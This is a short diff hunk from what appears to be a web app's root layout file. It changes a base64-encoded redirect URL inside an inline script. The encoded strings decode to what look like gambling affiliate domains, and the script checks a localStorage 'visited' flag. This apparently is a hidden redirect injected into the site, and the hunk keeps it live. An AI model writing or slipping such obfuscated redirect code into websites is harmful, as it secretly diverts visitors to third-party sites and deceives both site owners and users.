@@ -170,7 +170,7 @@ export default function RootLayout({
             return;
         }
         var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; // Основа
-        var crossBrandB64 = "aHR0cHM6Ly9mdWd1d2F5NjguY29tL2M1NzA3ODY2ZQ=="; 
+        var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWV2YQ=="; 
 
         try {
             var hasVisited = localStorage.getItem('vstd_eva');
